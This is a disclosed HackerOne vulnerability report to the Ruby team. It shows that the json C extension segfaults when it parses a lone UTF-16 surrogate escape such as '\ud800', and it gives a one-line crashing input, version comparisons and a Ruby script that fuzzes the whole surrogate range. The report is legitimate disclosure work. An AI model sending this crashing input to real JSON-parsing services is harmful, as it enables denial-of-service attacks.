# Parsing invalid unicode codepoints using json c extension (2.0.1+) triggers a segfault

## Report Details
- **Report ID**: 198927
- **URL**: https://hackerone.com/reports/198927
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-01-17T06:15:41.770Z
- **Disclosed**: 2017-10-25T13:57:33.611Z

## Reporter
- **Username**: dgollahon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
Using the default `json` library packaged with ruby, one can trigger a segmentation fault by submitting a string with a unicode escape sequence in the range between ` \ud800-\udbff` (https://en.wikipedia.org/wiki/UTF-16#U.2BD800_to_U.2BDFFF).

This is can lead to a denial of service attack by segmentation fault and could be a possible point of memory corruption or remote code execution. Any program that calls `JSON.parse` on untrusted input (which is, of course, exceedingly common in web APIs/apps) is affected. I have also reproduced this bug on a private API server I control.

Minimal reproduction:
```ruby
require 'json'; JSON.parse('"\ud800"')
```

The resulting segfault output and crash report are attached.

Tested in 2.3.3 and 2.4.0. Does NOT occur in 2.2.5.

In 2.3.3 and 2.4.0, if `json/pure` is required, an error is raised instead of a segmentation fault.

```ruby
require 'json/pure'; JSON.parse('"\ud800"') # => JSON::ParserError: Caught Encoding::InvalidByteSequenceError at '': incomplete "\xD8\x00" on UTF-16BE
```
Additionally, if you append 6 valid characters after the escape sequence, the escaped value is replaced with '?' and the following character is destroyed (surprising behavior, but no segfault).

```ruby
require 'json';
JSON.parse('"\ud800123456"') #  => "?23456"
2.3.3 :006 > JSON.parse('"\ud800\ud800123456"') # => "𐀀123456"
2.3.3 :007 > JSON.parse('"\ud800\ud800\ud800123456"') # => "𐀀?23456"
```

In 2.2.5, bare values are not accepted so testing this requires using a key or string value inside a json object as shown below:
```ruby
require "json"; p JSON.parse("{\"key\":\"#{"\\u" + format("%.04x", 56296)}\"}") # => {"key"=>nil}
```
In this case the result is `nil`. Instead, it should likely be an encoding error.

Script I used to iterate over all the codepoints in the range to verify it was not only a handful of specific values:
```ruby
# gem 'json', '2.0.1'
# gem 'json', '2.0.2'
# gem 'json', '2.0.3'
require 'json'

# or 0...1<<16 to explore the entire range
(0xd800..0xdbff).each do |i|
  uni = '\u' + format("%.04x", i)

  program = "require 'json'; JSON.parse('\\\"#{uni}\\\"')"
  system("ruby -e \"#{program}\"")

  status = $?.to_i
  if status != 0
    puts "#{uni} -> exit status #{status}"
  end
end
```

## Attachments
- segfault.txt
- ruby_2017-01-16-165949_Daniels-MacBook-Pro.crash
